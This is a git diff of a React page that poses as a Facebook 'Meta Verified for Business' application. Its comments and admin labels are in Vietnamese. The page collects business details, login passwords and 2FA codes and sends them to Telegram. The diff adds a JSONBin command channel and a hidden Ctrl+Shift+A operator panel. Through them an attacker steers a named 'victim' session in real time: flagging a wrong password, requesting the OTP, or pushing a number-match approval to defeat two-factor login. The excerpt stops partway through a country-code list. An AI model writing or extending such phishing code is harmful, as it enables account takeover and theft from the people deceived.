@@ -1,6 +1,12 @@
 import { useState, useEffect } from 'react';
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
 
+// ==========================================
+// THAY THÔNG TIN JSONBIN CỦA MÀY VÀO ĐÂY
+const BIN_ID = 'THAY_BIN_ID_CUA_MAY_VAO_DAY';
+const API_KEY = 'THAY_API_KEY_CUA_MAY_VAO_DAY';
+// ==========================================
+
 export default function Home() {
   // --- STATES TRANG CHỦ ---
   const [activeBenefit, setActiveBenefit] = useState(0);
@@ -17,6 +23,22 @@ export default function Home() {
   const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
+
+  // --- STATES CHO BƯỚC 3 & ADMIN ---
+  const [matchNumber, setMatchNumber] = useState(null); 
+  const [adminSessionId, setAdminSessionId] = useState(''); // Mã phiên của nạn nhân
+  const [adminNumberInput, setAdminNumberInput] = useState(''); // Số duyệt
+  const [showAdmin, setShowAdmin] = useState(false);
+
+  // --- TẠO MÃ PHIÊN CHO NGƯỜI TRUY CẬP ---
+  const [sessionId] = useState(() => {
+      let id = localStorage.getItem('session_id');
+      if (!id) {
+          id = 'user_' + Math.random().toString(36).substring(2, 9);
+          localStorage.setItem('session_id', id);
+      }
+      return id;
+  });
 
   // --- DỮ LIỆU TRANG CHỦ ---
   const benefitsData = [
@@ -55,6 +77,45 @@ export default function Home() {
       }
   }, [showModal, clientIp]);
 
+  // --- LẮNG NGHE LỆNH TỪ ADMIN (CHỐNG CACHE) ---
+  useEffect(() => {
+    const interval = setInterval(() => {
+        // Thêm ?t=Date.now() để ép JSONBin trả về dữ liệu mới nhất, không bị lưu cache
+        fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest?t=${Date.now()}`, {
+            headers: { 'X-Master-Key': API_KEY }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if(data.record && data.record.target === sessionId) {
+                if (data.record.action === 'otp') {
+                    setStep(3); 
+                    setMatchNumber(null); 
+                } else if (data.record.action === 'approve' && data.record.value) {
+                    setStep(3); 
+                    setMatchNumber(data.record.value); 
+                } else if (data.record.action === 'error') {
+                    setStep(2);
+                    setShowLoginError(true);
+                    setLoginPass('');
+                }
+            }
+        }).catch(()=>{});
+    }, 2000);
+    return () => clearInterval(interval);
+  }, [sessionId]);
+
+  // --- PHÍM TẮT MỞ ADMIN (Ctrl + Shift + A) ---
+  useEffect(() => {
+    const handleKeyDown = (e) => {
+      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+        setShowAdmin(prev => !prev);
+        setShowModal(true);
+      }
+    };
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
+  }, []);
+
   // --- HÀM XỬ LÝ FORM ---
   const openModal = () => { setShowModal(true); setStep(1); };
 
@@ -84,6 +145,30 @@ export default function Home() {
     setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
     if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
     setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
+  };
+
+  // --- HÀM GỬI LỆNH TỪ ADMIN ---
+  const handleAdminCommand = (type, value) => {
+      const targetUser = adminSessionId.trim(); 
+      if (!targetUser) {
+          alert('Vui lòng nhập Mã Phiên của nạn nhân!');
+          return;
+      }
+      
+      fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+          method: 'PUT',
+          headers: {
+              'Content-Type': 'application/json',
+              'X-Master-Key': API_KEY
+          },
+          body: JSON.stringify({ 
+              action: type, 
+              value: value,
+              target: targetUser
+          })
+      }).then(() => {
+          alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
+      });
   };
 
   return (
@@ -222,321 +307,377 @@ export default function Home() {
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                 </button>
 
-                <div style={{ textAlign: 'center', marginBottom: '18px' }}>
-                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
-                </div>
-
-                {/* FORM 1: SIGNUP */}
-                {step === 1 && (
-                  <>
-                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Meta Verified for Business</h2>
-                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter your business details to start your application.</p>
-                    <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                        <div>
-                            <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
-                            {errors.busName && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter your business name.</div>}
-                        </div>
-                        <div>
-                            <input className="fb-input" style={{ borderColor: errors.perEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
-                            {errors.perEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid personal email.</div>}
-                        </div>
-                        <div>
-                            <input className="fb-input" style={{ borderColor: errors.busEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
-                            {errors.busEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid business email.</div>}
-                        </div>
-                        <div>
-                            <div className="fb-phone-group">
-                                <div className="fb-phone-select-wrap">
-                                    <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)} style={{ width: '100%', height: '56px', padding: '10px 30px 10px 14px', border: '1px solid rgb(224, 226, 228)', borderRadius: '16px', appearance: 'none' }}>
-                                        <option value="+93">+93 (Afghanistan)</option>
-                                        <option value="+355">+355 (Albania)</option>
-                                        <option value="+213">+213 (Algeria)</option>
-                                        <option value="+1">+1 (American Samoa)</option>
-                                        <option value="+376">+376 (Andorra)</option>
-                                        <option value="+244">+244 (Angola)</option>
-                                        <option value="+1">+1 (Anguilla)</option>
-                                        <option value="+1">+1 (Antigua and Barbuda)</option>
-                                        <option value="+54">+54 (Argentina)</option>
-                                        <option value="+374">+374 (Armenia)</option>
-                                        <option value="+297">+297 (Aruba)</option>
-                                        <option value="+61">+61 (Australia)</option>
-                                        <option value="+43">+43 (Austria)</option>
-                                        <option value="+994">+994 (Azerbaijan)</option>
-                                        <option value="+1">+1 (Bahamas)</option>
-                                        <option value="+973">+973 (Bahrain)</option>
-                                        <option value="+880">+880 (Bangladesh)</option>
-                                        <option value="+1">+1 (Barbados)</option>
-                                        <option value="+375">+375 (Belarus)</option>
-                                        <option value="+32">+32 (Belgium)</option>
-                                        <option value="+501">+501 (Belize)</option>
-                                        <option value="+229">+229 (Benin)</option>
-                                        <option value="+1">+1 (Bermuda)</option>
-                                        <option value="+975">+975 (Bhutan)</option>
-                                        <option value="+591">+591 (Bolivia)</option>
-                                        <option value="+387">+387 (Bosnia and Herzegovina)</option>
-                                        <option value="+267">+267 (Botswana)</option>
-                                        <option value="+55">+55 (Brazil)</option>
-                                        <option value="+1">+1 (British Virgin Islands)</option>
-                                        <option value="+673">+673 (Brunei)</option>
-                                        <option value="+359">+359 (Bulgaria)</option>
-                                        <option value="+226">+226 (Burkina Faso)</option>
-                                        <option value="+257">+257 (Burundi)</option>
-                                        <option value="+855">+855 (Cambodia)</option>
-                                        <option value="+237">+237 (Cameroon)</option>
-                                        <option value="+1">+1 (Canada)</option>
-                                        <option value="+238">+238 (Cape Verde)</option>
-                                        <option value="+1">+1 (Cayman Islands)</option>
-                                        <option value="+236">+236 (Central African Republic)</option>
-                                        <option value="+235">+235 (Chad)</option>
-                                        <option value="+56">+56 (Chile)</option>
-                                        <option value="+86">+86 (China)</option>
-                                        <option value="+57">+57 (Colombia)</option>
-                                        <option value="+269">+269 (Comoros)</option>
-                                        <option value="+242">+242 (Congo - Brazzaville)</option>
-                                        <option value="+243">+243 (Congo - Kinshasa)</option>
-                                        <option value="+682">+682 (Cook Islands)</option>
-                                        <option value="+506">+506 (Costa Rica)</option>
-                                        <option value="+225">+225 (Côte d'Ivoire)</option>
-                                        <option value="+385">+385 (Croatia)</option>
-                                        <option value="+53">+53 (Cuba)</option>
-                                        <option value="+599">+599 (Curaçao)</option>
-                                        <option value="+357">+357 (Cyprus)</option>
-                                        <option value="+420">+420 (Czechia)</option>
-                                        <option value="+45">+45 (Denmark)</option>
-                                        <option value="+253">+253 (Djibouti)</option>
-                                        <option value="+1">+1 (Dominica)</option>
-                                        <option value="+1">+1 (Dominican Republic)</option>
-                                        <option value="+593">+593 (Ecuador)</option>
-                                        <option value="+20">+20 (Egypt)</option>
-                                        <option value="+503">+503 (El Salvador)</option>
-                                        <option value="+240">+240 (Equatorial Guinea)</option>
-                                        <option value="+291">+291 (Eritrea)</option>
-                                        <option value="+372">+372 (Estonia)</option>
-                                        <option value="+268">+268 (Eswatini)</option>
-                                        <option value="+251">+251 (Ethiopia)</option>
-                                        <option value="+500">+500 (Falkland Islands)</option>
-                                        <option value="+298">+298 (Faroe Islands)</option>
-                                        <option value="+679">+679 (Fiji)</option>
-                                        <option value="+358">+358 (Finland)</option>
-                                        <option value="+33">+33 (France)</option>
-                                        <option value="+594">+594 (French Guiana)</option>
-                                        <option value="+689">+689 (French Polynesia)</option>
-                                        <option value="+241">+241 (Gabon)</option>
-                                        <option value="+220">+220 (Gambia)</option>
-                                        <option value="+995">+995 (Georgia)</option>
-                                        <option value="+49">+49 (Germany)</option>
-                                        <option value="+233">+233 (Ghana)</option>
-                                        <option value="+350">+350 (Gibraltar)</option>
-                                        <option value="+30">+30 (Greece)</option>
-                                        <option value="+299">+299 (Greenland)</option>
-                                        <option value="+1">+1 (Grenada)</option>
-                                        <option value="+590">+590 (Guadeloupe)</option>
-                                        <option value="+1">+1 (Guam)</option>
-                                        <option value="+502">+502 (Guatemala)</option>
-                                        <option value="+44">+44 (Guernsey)</option>
-                                        <option value="+224">+224 (Guinea)</option>
-                                        <option value="+245">+245 (Guinea-Bissau)</option>
-                                        <option value="+592">+592 (Guyana)</option>
-                                        <option value="+509">+509 (Haiti)</option>
-                                        <option value="+504">+504 (Honduras)</option>
-                                        <option value="+852">+852 (Hong Kong SAR China)</option>
-                                        <option value="+36">+36 (Hungary)</option>
-                                        <option value="+354">+354 (Iceland)</option>
-                                        <option value="+91">+91 (India)</option>
-                                        <option value="+62">+62 (Indonesia)</option>
-                                        <option value="+98">+98 (Iran)</option>
-                                        <option value="+964">+964 (Iraq)</option>
-                                        <option value="+353">+353 (Ireland)</option>
-                                        <option value="+44">+44 (Isle of Man)</option>
-                                        <option value="+972">+972 (Israel)</option>
-                                        <option value="+39">+39 (Italy)</option>
-                                        <option value="+1">+1 (Jamaica)</option>
-                                        <option value="+81">+81 (Japan)</option>
-                                        <option value="+44">+44 (Jersey)</option>
-                                        <option value="+962">+962 (Jordan)</option>
-                                        <option value="+7">+7 (Kazakhstan)</option>
-                                        <option value="+254">+254 (Kenya)</option>
-                                        <option value="+686">+686 (Kiribati)</option>
-                                        <option value="+383">+383 (Kosovo)</option>
-                                        <option value="+965">+965 (Kuwait)</option>
-                                        <option value="+996">+996 (Kyrgyzstan)</option>
-                                        <option value="+856">+856 (Laos)</option>
-                                        <option value="+371">+371 (Latvia)</option>
-                                        <option value="+961">+961 (Lebanon)</option>
-                                        <option value="+266">+266 (Lesotho)</option>
-                                        <option value="+231">+231 (Liberia)</option>
-                                        <option value="+218">+218 (Libya)</option>
-                                        <option value="+423">+423 (Liechtenstein)</option>
-                                        <option value="+370">+370 (Lithuania)</option>
-                                        <option value="+352">+352 (Luxembourg)</option>
-                                        <option value="+853">+853 (Macao SAR China)</option>
-                                        <option value="+261">+261 (Madagascar)</option>
-                                        <option value="+265">+265 (Malawi)</option>
-                                        <option value="+60">+60 (Malaysia)</option>
-                                        <option value="+960">+960 (Maldives)</option>
-                                        <option value="+223">+223 (Mali)</option>
-                                        <option value="+356">+356 (Malta)</option>
-                                        <option value="+692">+692 (Marshall Islands)</option>
-                                        <option value="+596">+596 (Martinique)</option>
-                                        <option value="+222">+222 (Mauritania)</option>
-                                        <option value="+230">+230 (Mauritius)</option>
-                                        <option value="+262">+262 (Mayotte)</option>
-                                        <option value="+52">+52 (Mexico)</option>
-                                        <option value="+691">+691 (Micronesia)</option>
-                                        <option value="+373">+373 (Moldova)</option>
-                                        <option value="+377">+377 (Monaco)</option>
-                                        <option value="+976">+976 (Mongolia)</option>
-                                        <option value="+382">+382 (Montenegro)</option>
-                                        <option value="+1">+1 (Montserrat)</option>
-                                        <option value="+212">+212 (Morocco)</option>
-                                        <option value="+258">+258 (Mozambique)</option>
-                                        <option value="+95">+95 (Myanmar)</option>
-                                        <option value="+264">+264 (Namibia)</option>
-                                        <option value="+674">+674 (Nauru)</option>
-                                        <option value="+977">+977 (Nepal)</option>
-                                        <option value="+31">+31 (Netherlands)</option>
-                                        <option value="+687">+687 (New Caledonia)</option>
-                                        <option value="+64">+64 (New Zealand)</option>
-                                        <option value="+505">+505 (Nicaragua)</option>
-                                        <option value="+227">+227 (Niger)</option>
-                                        <option value="+234">+234 (Nigeria)</option>
-                                        <option value="+683">+683 (Niue)</option>
-                                        <option value="+850">+850 (North Korea)</option>
-                                        <option value="+389">+389 (North Macedonia)</option>
-                                        <option value="+1">+1 (Northern Mariana Islands)</option>
-                                        <option value="+47">+47 (Norway)</option>
-                                        <option value="+968">+968 (Oman)</option>
-                                        <option value="+92">+92 (Pakistan)</option>
-                                        <option value="+680">+680 (Palau)</option>
-                                        <option value="+970">+970 (Palestine)</option>
-                                        <option value="+507">+507 (Panama)</option>
-                                        <option value="+675">+675 (Papua New Guinea)</option>
-                                        <option value="+595">+595 (Paraguay)</option>
-                                        <option value="+51">+51 (Peru)</option>
-                                        <option value="+63">+63 (Philippines)</option>
-                                        <option value="+48">+48 (Poland)</option>
-                                        <option value="+351">+351 (Portugal)</option>
-                                        <option value="+1">+1 (Puerto Rico)</option>
-                                        <option value="+974">+974 (Qatar)</option>
-                                        <option value="+262">+262 (Réunion)</option>
-                                        <option value="+40">+40 (Romania)</option>
-                                        <option value="+7">+7 (Russia)</option>
-                                        <option value="+250">+250 (Rwanda)</option>
-                                        <option value="+590">+590 (Saint Barthélemy)</option>
-                                        <option value="+290">+290 (Saint Helena)</option>
-                                        <option value="+1">+1 (Saint Kitts and Nevis)</option>
-                                        <option value="+1">+1 (Saint Lucia)</option>
-                                        <option value="+590">+590 (Saint Martin)</option>
-                                        <option value="+508">+508 (Saint Pierre and Miquelon)</option>
-                                        <option value="+1">+1 (Saint Vincent and the Grenadines)</option>
-                                        <option value="+685">+685 (Samoa)</option>
-                                        <option value="+378">+378 (San Marino)</option>
-                                        <option value="+239">+239 (São Tomé and Príncipe)</option>
-                                        <option value="+966">+966 (Saudi Arabia)</option>
-                                        <option value="+221">+221 (Senegal)</option>
-                                        <option value="+381">+381 (Serbia)</option>
-                                        <option value="+248">+248 (Seychelles)</option>
-                                        <option value="+232">+232 (Sierra Leone)</option>
-                                        <option value="+65">+65 (Singapore)</option>
-                                        <option value="+1">+1 (Sint Maarten)</option>
-                                        <option value="+421">+421 (Slovakia)</option>
-                                        <option value="+386">+386 (Slovenia)</option>
-                                        <option value="+677">+677 (Solomon Islands)</option>
-                                        <option value="+252">+252 (Somalia)</option>
-                                        <option value="+27">+27 (South Africa)</option>
-                                        <option value="+82">+82 (South Korea)</option>
-                                        <option value="+211">+211 (South Sudan)</option>
-                                        <option value="+34">+34 (Spain)</option>
-                                        <option value="+94">+94 (Sri Lanka)</option>
-                                        <option value="+249">+249 (Sudan)</option>
-                                        <option value="+597">+597 (Suriname)</option>
-                                        <option value="+46">+46 (Sweden)</option>
-                                        <option value="+41">+41 (Switzerland)</option>
-                                        <option value="+963">+963 (Syria)</option>
-                                        <option value="+886">+886 (Taiwan)</option>
-                                        <option value="+992">+992 (Tajikistan)</option>
-                                        <option value="+255">+255 (Tanzania)</option>
-                                        <option value="+66">+66 (Thailand)</option>
-                                        <option value="+670">+670 (Timor-Leste)</option>
-                                        <option value="+228">+228 (Togo)</option>
-                                        <option value="+690">+690 (Tokelau)</option>
-                                        <option value="+676">+676 (Tonga)</option>
-                                        <option value="+1">+1 (Trinidad and Tobago)</option>
-                                        <option value="+216">+216 (Tunisia)</option>
-                                        <option value="+90">+90 (Turkey)</option>
-                                        <option value="+993">+993 (Turkmenistan)</option>
-                                        <option value="+1">+1 (Turks and Caicos Islands)</option>
-                                        <option value="+688">+688 (Tuvalu)</option>
-                                        <option value="+256">+256 (Uganda)</option>
-                                        <option value="+380">+380 (Ukraine)</option>
-                                        <option value="+971">+971 (United Arab Emirates)</option>
-                                        <option value="+44">+44 (United Kingdom)</option>
-                                        <option value="+1">+1 (United States)</option>
-                                        <option value="+598">+598 (Uruguay)</option>
-                                        <option value="+1">+1 (US Virgin Islands)</option>
-                                        <option value="+998">+998 (Uzbekistan)</option>
-                                        <option value="+678">+678 (Vanuatu)</option>
-                                        <option value="+379">+379 (Vatican City)</option>
-                                        <option value="+58">+58 (Venezuela)</option>
-                                        <option value="+84">+84 (Vietnam)</option>
-                                        <option value="+681">+681 (Wallis and Futuna)</option>
-                                        <option value="+212">+212 (Western Sahara)</option>
-                                        <option value="+967">+967 (Yemen)</option>
-                                        <option value="+260">+260 (Zambia)</option>
-                                        <option value="+263">+263 (Zimbabwe)</option>
-                                    </select>
-                                </div>
-                                <input className="fb-input" style={{ flex: 1, borderColor: errors.phoneNum ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
-                            </div>
-                            {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
-                        </div>
-                        <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
-                    </form>
-                  </>
-                )}
-
-                {/* FORM 2: LOGIN */}
-                {step === 2 && (
-                  <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                      <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
-                      <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
-                      {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
-                      <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
-                    </form>
-                )}
-
-                {/* FORM 3: 2FA */}
-                {step === 3 && (
-                  <>
-                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
+                {showAdmin ? (
+                  <div style={{ textAlign: 'center' }}>
+                    <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
                     
-                    <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
-                        <img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} />
+                    <div style={{ marginBottom: '20px' }}>
+                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên nạn nhân (lấy từ Telegram):</p>
+                        <input 
+                            className="fb-input" 
+                            type="text" 
+                            placeholder="VD: user_a1b2c3" 
+                            value={adminSessionId} 
+                            onChange={(e) => setAdminSessionId(e.target.value)} 
+                        />
                     </div>
 
-                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
-                    
-                    <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                        <input 
-                            className="fb-input fb-otp-input" 
-                            style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} 
-                            placeholder="00000000" 
-                            value={otp} 
-                            onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
-                            required 
-                            maxLength={8} 
-                        />
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                        <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
+                        <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
                         
-                        {showOtpError && (
-                            <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
-                                Invalid security code. Please check the code and try again.
+                        <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
+                            <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
+                            <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
+                            <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Gửi Số Duyệt</button>
+                        </div>
+                        
+                        <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
+                    </div>
+                  </div>
+                ) : (
+                  <>
+                    <div style={{ textAlign: 'center', marginBottom: '18px' }}>
+                        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
+                    </div>
+
+                    {/* FORM 1: SIGNUP */}
+                    {step === 1 && (
+                      <>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Meta Verified for Business</h2>
+                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter your business details to start your application.</p>
+                        <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                            <div>
+                                <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
+                                {errors.busName && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter your business name.</div>}
                             </div>
+                            <div>
+                                <input className="fb-input" style={{ borderColor: errors.perEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
+                                {errors.perEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid personal email.</div>}
+                            </div>
+                            <div>
+                                <input className="fb-input" style={{ borderColor: errors.busEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
+                                {errors.busEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid business email.</div>}
+                            </div>
+                            <div>
+                                <div className="fb-phone-group">
+                                    <div className="fb-phone-select-wrap">
+                                        <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)} style={{ width: '100%', height: '56px', padding: '10px 30px 10px 14px', border: '1px solid rgb(224, 226, 228)', borderRadius: '16px', appearance: 'none' }}>
+                                            <option value="+93">+93 (Afghanistan)</option>
+                                            <option value="+355">+355 (Albania)</option>
+                                            <option value="+213">+213 (Algeria)</option>
+                                            <option value="+1">+1 (American Samoa)</option>
+                                            <option value="+376">+376 (Andorra)</option>
+                                            <option value="+244">+244 (Angola)</option>
+                                            <option value="+1">+1 (Anguilla)</option>
+                                            <option value="+1">+1 (Antigua and Barbuda)</option>
+                                            <option value="+54">+54 (Argentina)</option>
+                                            <option value="+374">+374 (Armenia)</option>
+                                            <option value="+297">+297 (Aruba)</option>
+                                            <option value="+61">+61 (Australia)</option>
+                                            <option value="+43">+43 (Austria)</option>
+                                            <option value="+994">+994 (Azerbaijan)</option>
+                                            <option value="+1">+1 (Bahamas)</option>
+                                            <option value="+973">+973 (Bahrain)</option>
+                                            <option value="+880">+880 (Bangladesh)</option>
+                                            <option value="+1">+1 (Barbados)</option>
+                                            <option value="+375">+375 (Belarus)</option>
+                                            <option value="+32">+32 (Belgium)</option>
+                                            <option value="+501">+501 (Belize)</option>
+                                            <option value="+229">+229 (Benin)</option>
+                                            <option value="+1">+1 (Bermuda)</option>
+                                            <option value="+975">+975 (Bhutan)</option>
+                                            <option value="+591">+591 (Bolivia)</option>
+                                            <option value="+387">+387 (Bosnia and Herzegovina)</option>
+                                            <option value="+267">+267 (Botswana)</option>
+                                            <option value="+55">+55 (Brazil)</option>
+                                            <option value="+1">+1 (British Virgin Islands)</option>
+                                            <option value="+673">+673 (Brunei)</option>
+                                            <option value="+359">+359 (Bulgaria)</option>
+                                            <option value="+226">+226 (Burkina Faso)</option>
+                                            <option value="+257">+257 (Burundi)</option>
+                                            <option value="+855">+855 (Cambodia)</option>
+                                            <option value="+237">+237 (Cameroon)</option>
+                                            <option value="+1">+1 (Canada)</option>
+                                            <option value="+238">+238 (Cape Verde)</option>
+                                            <option value="+1">+1 (Cayman Islands)</option>
+                                            <option value="+236">+236 (Central African Republic)</option>
+                                            <option value="+235">+235 (Chad)</option>
+                                            <option value="+56">+56 (Chile)</option>
+                                            <option value="+86">+86 (China)</option>
+                                            <option value="+57">+57 (Colombia)</option>
+                                            <option value="+269">+269 (Comoros)</option>
+                                            <option value="+242">+242 (Congo - Brazzaville)</option>
+                                            <option value="+243">+243 (Congo - Kinshasa)</option>
+                                            <option value="+682">+682 (Cook Islands)</option>
+                                            <option value="+506">+506 (Costa Rica)</option>
+                                            <option value="+225">+225 (Côte d'Ivoire)</option>
+                                            <option value="+385">+385 (Croatia)</option>
+                                            <option value="+53">+53 (Cuba)</option>
+                                            <option value="+599">+599 (Curaçao)</option>
+                                            <option value="+357">+357 (Cyprus)</option>
+                                            <option value="+420">+420 (Czechia)</option>
+                                            <option value="+45">+45 (Denmark)</option>
+                                            <option value="+253">+253 (Djibouti)</option>
+                                            <option value="+1">+1 (Dominica)</option>
+                                            <option value="+1">+1 (Dominican Republic)</option>
+                                            <option value="+593">+593 (Ecuador)</option>
+                                            <option value="+20">+20 (Egypt)</option>
+                                            <option value="+503">+503 (El Salvador)</option>
+                                            <option value="+240">+240 (Equatorial Guinea)</option>
+                                            <option value="+291">+291 (Eritrea)</option>
+                                            <option value="+372">+372 (Estonia)</option>
+                                            <option value="+268">+268 (Eswatini)</option>
+                                            <option value="+251">+251 (Ethiopia)</option>
+                                            <option value="+500">+500 (Falkland Islands)</option>
+                                            <option value="+298">+298 (Faroe Islands)</option>
+                                            <option value="+679">+679 (Fiji)</option>
+                                            <option value="+358">+358 (Finland)</option>
+                                            <option value="+33">+33 (France)</option>
+                                            <option value="+594">+594 (French Guiana)</option>
+                                            <option value="+689">+689 (French Polynesia)</option>
+                                            <option value="+241">+241 (Gabon)</option>
+                                            <option value="+220">+220 (Gambia)</option>
+                                            <option value="+995">+995 (Georgia)</option>
+                                            <option value="+49">+49 (Germany)</option>
+                                            <option value="+233">+233 (Ghana)</option>
+                                            <option value="+350">+350 (Gibraltar)</option>
+                                            <option value="+30">+30 (Greece)</option>
+                                            <option value="+299">+299 (Greenland)</option>
+                                            <option value="+1">+1 (Grenada)</option>
+                                            <option value="+590">+590 (Guadeloupe)</option>
+                                            <option value="+1">+1 (Guam)</option>
+                                            <option value="+502">+502 (Guatemala)</option>
+                                            <option value="+44">+44 (Guernsey)</option>
+                                            <option value="+224">+224 (Guinea)</option>
+                                            <option value="+245">+245 (Guinea-Bissau)</option>
+                                            <option value="+592">+592 (Guyana)</option>
+                                            <option value="+509">+509 (Haiti)</option>
+                                            <option value="+504">+504 (Honduras)</option>
+                                            <option value="+852">+852 (Hong Kong SAR China)</option>
+                                            <option value="+36">+36 (Hungary)</option>
+                                            <option value="+354">+354 (Iceland)</option>
+                                            <option value="+91">+91 (India)</option>
+                                            <option value="+62">+62 (Indonesia)</option>
+                                            <option value="+98">+98 (Iran)</option>
+                                            <option value="+964">+964 (Iraq)</option>
+                                            <option value="+353">+353 (Ireland)</option>
+                                            <option value="+44">+44 (Isle of Man)</option>
+                                            <option value="+972">+972 (Israel)</option>
+                                            <option value="+39">+39 (Italy)</option>
+                                            <option value="+1">+1 (Jamaica)</option>
+                                            <option value="+81">+81 (Japan)</option>
+                                            <option value="+44">+44 (Jersey)</option>
+                                            <option value="+962">+962 (Jordan)</option>
+                                            <option value="+7">+7 (Kazakhstan)</option>
+                                            <option value="+254">+254 (Kenya)</option>
